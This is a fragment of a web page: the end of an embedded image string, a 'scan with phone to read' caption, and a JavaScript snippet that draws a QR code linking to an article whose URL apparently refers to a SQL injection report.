QDAA0HYrDd7R+fAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-jztEditorScore-queryEditorScoreRank-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 